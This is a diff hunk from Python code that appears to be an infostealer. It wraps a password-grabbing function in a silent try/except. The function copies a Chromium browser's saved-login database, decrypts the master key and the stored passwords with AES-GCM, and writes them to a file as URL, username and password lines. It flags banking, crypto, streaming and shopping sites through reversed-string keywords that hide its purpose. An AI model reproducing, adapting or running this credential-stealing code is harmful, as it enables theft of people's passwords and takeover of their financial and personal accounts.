@@ -1271,56 +1271,57 @@ Passw = []
 
 def getPassw(path, arg):
 
+    try:
+        def decrval(buff, master_key=None):
+            starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+            if starts in ['v10', 'v11']:
+                iv = buff[3:15]
+                payload = buff[15:]
+                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                decrypted_pass = cipher.decrypt(payload)
+                decrypted_pass = decrypted_pass[:-16].decode()
+                return decrypted_pass
+            
+        global Passw, PasswCount
+        if not os.path.exists(path): return
 
-    def decrval(buff, master_key=None):
-        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
-        if starts in ['v10', 'v11']:
-            iv = buff[3:15]
-            payload = buff[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)
-            decrypted_pass = decrypted_pass[:-16].decode()
-            return decrypted_pass
-        
-    global Passw, PasswCount
-    if not os.path.exists(path): return
+        pathC = path + arg + "/Login Data"
+        if os.stat(pathC).st_size == 0: return
 
-    pathC = path + arg + "/Login Data"
-    if os.stat(pathC).st_size == 0: return
+        tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
-    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
-
-    shutil.copy2(pathC, tempfold)
-    conn = sql_connect(tempfold)
-    cursor = conn.cursor()
-    cursor.execute(f"SELECT action_url, username_value, {pas[::-1]}_value FROM logins;")
-    data = cursor.fetchall()
-    cursor.close()
-    conn.close()
-    os.remove(tempfold)
-    es = 'tpyrc_so'
-    ess= 'yek_detpyrcne'
-    pathKey = path + "/Local State"
-    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
-    master_key = b64decode(local_state[es[::-1]][ess[::-1]])
-    master_key = cryptunproct(master_key[5:])
-    keys = [
-    'liam', ')moc.esabnioc//:sptth(]esabnioc[', ')moc.xilften//:sptth(]xilften[' ,')moc.rebu//:sptth(]rebu[' ,'otpyrc' ,')moc.npvsserpxe//:sptth(]npvsserpxe[' ,')moc.yensid//:sptth(]yensid[' ,')moc.buhnrop//:sptth(]buhnrop[' ,')moc.margelet//:sptth(]margelet[' ,')moc.lloryhcnurc//:sptth(]lloryhcnurc[' ,')moc.kooltuo//:sptth(]kooltuo[' ,')moc.liamtoh//:sptth(]liamtoh[' ,')moc.ecnanib//:sptth(]ecnanib[' ,'lles' ,'yub' ,')moc.xobx//:sptth(]xobx[' ,')moc.obh//:sptth(]obh[' ,')moc.noitatsyalp//:sptth(]noitatsyalp[' ,')moc.sserpxeila//:sptth(]sserpxeila[' ,')moc.yabe//:sptth(]yabe[' ,')moc.nozama//:sptth(]nozama[' ,')moc.nigiro//:sptth(]nigiro[' ,')moc.lapyap//:sptth(]lapyap[' ,'knab' ,')ten.tfarcenim//:sptth(]tfarcenim[' ,')moc.hctiwt//:sptth(]hctiwt[' ,')moc.xolbor//:sptth(]xolbor[' ,')moc.oohay//:sptth(]oohay[' ,')moc.yfitops//:sptth(]yfitops[' ,')moc.semagcipe//:sptth(]semagcipe[' ,'drac' ,')moc.koobecaf//:sptth(]koobecaf[' ,')moc.rettiwt//:sptth(]rettiwt[' ,')moc.kotkit//:sptth(]kotkit[']
-    for row in data: 
-        if row[0] != '':
-            for wa in keys[::-1]:
-                old = wa
-                if "https" in wa:
-                    tmp = wa
-                    wa = tmp.split('[')[1].split(']')[0]
-                if wa in row[0]:
-                    if not old in paswWords: paswWords.append(old)
-            us = 'emanresU'
-            ur = 'lrU'
-            Passw.append(f"{ur[::-1]}: {row[0]} | {us[::-1]}: {row[1]} | {pas[::-1]}: {decrval(row[2], master_key)}")
-            PasswCount += 1
-    writeforfile(Passw, 'passw')
-    
+        shutil.copy2(pathC, tempfold)
+        conn = sql_connect(tempfold)
+        cursor = conn.cursor()
+        cursor.execute(f"SELECT action_url, username_value, {pas[::-1]}_value FROM logins;")
+        data = cursor.fetchall()
+        cursor.close()
+        conn.close()
+        os.remove(tempfold)
+        es = 'tpyrc_so'
+        ess= 'yek_detpyrcne'
+        pathKey = path + "/Local State"
+        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
+        master_key = b64decode(local_state[es[::-1]][ess[::-1]])
+        master_key = cryptunproct(master_key[5:])
+        keys = [
+        'liam', ')moc.esabnioc//:sptth(]esabnioc[', ')moc.xilften//:sptth(]xilften[' ,')moc.rebu//:sptth(]rebu[' ,'otpyrc' ,')moc.npvsserpxe//:sptth(]npvsserpxe[' ,')moc.yensid//:sptth(]yensid[' ,')moc.buhnrop//:sptth(]buhnrop[' ,')moc.margelet//:sptth(]margelet[' ,')moc.lloryhcnurc//:sptth(]lloryhcnurc[' ,')moc.kooltuo//:sptth(]kooltuo[' ,')moc.liamtoh//:sptth(]liamtoh[' ,')moc.ecnanib//:sptth(]ecnanib[' ,'lles' ,'yub' ,')moc.xobx//:sptth(]xobx[' ,')moc.obh//:sptth(]obh[' ,')moc.noitatsyalp//:sptth(]noitatsyalp[' ,')moc.sserpxeila//:sptth(]sserpxeila[' ,')moc.yabe//:sptth(]yabe[' ,')moc.nozama//:sptth(]nozama[' ,')moc.nigiro//:sptth(]nigiro[' ,')moc.lapyap//:sptth(]lapyap[' ,'knab' ,')ten.tfarcenim//:sptth(]tfarcenim[' ,')moc.hctiwt//:sptth(]hctiwt[' ,')moc.xolbor//:sptth(]xolbor[' ,')moc.oohay//:sptth(]oohay[' ,')moc.yfitops//:sptth(]yfitops[' ,')moc.semagcipe//:sptth(]semagcipe[' ,'drac' ,')moc.koobecaf//:sptth(]koobecaf[' ,')moc.rettiwt//:sptth(]rettiwt[' ,')moc.kotkit//:sptth(]kotkit[']
+        for row in data: 
+            if row[0] != '':
+                for wa in keys[::-1]:
+                    old = wa
+                    if "https" in wa:
+                        tmp = wa
+                        wa = tmp.split('[')[1].split(']')[0]
+                    if wa in row[0]:
+                        if not old in paswWords: paswWords.append(old)
+                us = 'emanresU'
+                ur = 'lrU'
+                Passw.append(f"{ur[::-1]}: {row[0]} | {us[::-1]}: {row[1]} | {pas[::-1]}: {decrval(row[2], master_key)}")
+                PasswCount += 1
+        writeforfile(Passw, 'passw')
+    except:
+        pass
     
 def getinfo():
     
